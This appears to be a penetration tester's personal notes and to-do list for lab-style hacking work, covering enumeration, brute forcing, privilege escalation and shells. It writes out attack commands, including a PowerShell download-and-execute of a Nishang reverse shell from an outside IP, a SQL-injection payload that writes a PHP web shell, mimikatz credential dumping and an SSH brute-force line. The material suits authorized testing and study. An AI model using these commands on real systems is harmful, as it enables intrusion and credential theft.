Add commands for ffuf in web server enumeration section

Add commands for hydra, john, hashcat, etc. in credentials brute forcing section

Add lookupsid command

Add command for sqsh exploitation

Add manual commands for Linux priv esc. (cross reference https://sirensecurity.io/blog/linux-privilege-escalation-resources/). Link to gtfobins as well. Maybe even add common SUID exploits like cp and password file?

Figure out stuff for blind/time based SQL injection

Add notes to MySQL/update checking for processes running as root. If MySQL is running as root, check if it's vulnerable to https://github.com/am0nsec/exploit/blob/master/linux/privs/MysqlUDF/mysql_udf_exploit.sh

Add manual note for proxychains: ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -D 9050 -f -N excalibur@10.11.1.252 -p 22000

Add note for proxychains -q

Add notes for ffuf with proxy usage -x socks5://127.0.0.1:9050

Add note about command injection bypass in burp. Web page request may be adding encoding to the command so it's best to submit it through burp to ensure the request goes through unaltered.

https://hackersonlineclub.com/command-injection-cheatsheet/

Maybe add note to where if you have a way to read files from a web server and are trying to bypass a blacklist filter, see if you can look at any of the files to see if you can determine what is being black listed

wget -r -l1 --no-parent -A .php -O webshell.php 192.168.119.122 (only useful when you can't download extensions with / in them and from SimpleHTTPServer)

Add notes about spraying creds against entire subnet with crackmapexec

Add note about telnet -l <username> if you have credentials that don't seem to work anywhere else to see if you can get a session

Add note about accesschk.exe on any interesting script, file, etc. for possible exploitation

Add note about FTP and doing cd .. dir ..// ls ..// to see what you can access

Add note about checking httpd.conf file for locations of web sites?

Add note about checking for c:\xampp\password if xampp is present

Add note about checking what services are running as SYSTEM on a host, and if you may be able to write to the directory where the process is running. This is the equivalent of a process running as root in Linux and being able to create files in that directory. In the event of a web server running as SYSTEM, and your shell is a web server user, you will more than likely be able to write to the directory where the web server is serving content from. Therefore, you can drop in a shell file and it should execute with SYSTEM privileges

Add link for https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat and also book.hacktricks.xyz lookups. Also state to use cmd.exe /c with tomcat shell

https://raw.githubusercontent.com/jbarcia/Web-Shells/master/laudanum/jsp/warfiles/cmd.jsp -- take out the top bit with the 4.4.4.4

https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/

patator ssh_login host=$IP user=sean password=FILE0 0=/usr/share/wordlists/rockyou.txt

Add note about staged vs. unstaged payloads - https://hakluke.medium.com/haklukes-guide-to-hacking-without-metasploit-1bbbe3d14f90. Use windows/shell_reverse_tcp for Windows boxes!

Look at any .gitignore files for sensitive files

Add to try to TELNET to weird ports too for banner grabbing (in addition to netcatting)

Add notes about different wordlists to use: /usr/share/wordlists/wfuzz/others/common_pass.txt

https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

Add note about using Nishang PowerShell TCP and using PowerShell DownloadString to run files in memory - powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.104:8080/nishang.ps1')

Any time you have an RCE exploit, just try something simple like a wget or a ping and not just go for the shell. Build it up and confirm it works first and then troubleshoot

If an exploit is making a shell connection but you don't see an IP and just a port, it's likely a bind shell and you will need to connect to the host through that port.

Always try to base64 -d credentials if they're not working to see if you can get something decoded

ALWAYS SWITCH TO BINARY MODE ON FTP!

If for some reason you need to port forward and have SSH access but can't use chisel, etc., use ssh port forwarding:  sudo ssh -L <PORT-ON-KALI>:127.0.0.1:<PORT-TO-FORWARD> ariah@192.168.120.209

Always check netstat output for any local services that may have been missed since they are listening internally. Common things to look for may be an internal web server or some custom application listening on an internal only port

Test what methods a web server allows curl -v -X OPTIONS http://192.168.1.109

Add note about testing LFI for RFI as well

Add note about always taking usernames and trying to brute force

Add note to start the cycle over again - every time you get creds to something (FTP), see what you can do with them (upload, etc.)

Always try simple creds 1st (admin:admin, etc.)

mysql running as root? Check for UDF raptor exploit

Run git log in any git repos found for anything of interest

If you're not getting a directory listing back from an FTP server with valid credentials, restart the connection with ftp -p to put it in passive mode

Add commands to dump mimikatz creds: privilege::debug, token::elevate, lsadump::sam

Update ffuf command to also look for 401s

Search for all non Windows Services: wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"

Look to see what user a service is running as: sc qc SERVICE_NAME

PowerShell method of checking ACLS: powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"

Check Windows registry for keys that contain password: reg query HKLM /f password /t REG_SZ /s

For directory scans, if you get responses for weird hits from the wordlist, maybe narrow down the range of accepted response codes

Always look at phpinfo.php files to see if you can get web server locations, possible usage for downloading/uploading a shell to later on

UNION SELECT to get reverse shell on to target: ' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'

If you find a service with a login page, try just the service name as the username and password. E.g. nexus, try nexus/nexus

On Windows boxes, when you download a shell, always download it to %PUBLIC%

Find all services on windows: sc queryex type=service state=all

When enumerating web sites, just run it all through burp

Droopescan if you see drupal icon (little blue fire looking guy)

If you can modify a .service file and restart the service or the system, set the ExecStart as nc or some other reverse shell command and the user as root to get root access

Check if Docker containers are running privileged (if so, can be used to access host system): docker inspect --format='{{.HostConfig.Privileged}}' [container_id]